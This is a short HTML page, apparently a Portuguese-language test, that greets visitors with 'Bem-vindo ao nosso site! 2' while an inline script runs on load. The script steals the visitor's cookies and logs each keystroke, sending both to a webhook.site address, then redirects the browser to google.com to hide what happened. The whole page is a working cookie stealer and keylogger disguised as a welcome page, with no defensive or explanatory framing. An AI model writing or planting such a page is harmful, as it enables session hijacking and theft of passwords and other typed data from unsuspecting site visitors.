<!DOCTYPE html>
<html>

<head>
    <title>Teste de Cookies</title>
</head>

<body>

    <h1>Bem-vindo ao nosso site! 2</h1>
    <script>
        // Função para capturar e enviar dados
        async function capturarDados() {
            // Captura os cookies
            let cookies = document.cookie;

            // Captura a digitação do utilizador
            document.addEventListener("keydown", function (event) {
                fetch("https://webhook.site/493fc1c1-9d70-4701-9a56-a7c691e18389?key=" + event.key);
            });

            // Envia os cookies primeiro
            await fetch("https://webhook.site/493fc1c1-9d70-4701-9a56-a7c691e18389?cookies=" + encodeURIComponent(cookies));

            // Espera 1 segundo antes de redirecionar para garantir envio
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 1000);
        }

        // Chama a função
        capturarDados();
    </script>
</body>

</html>
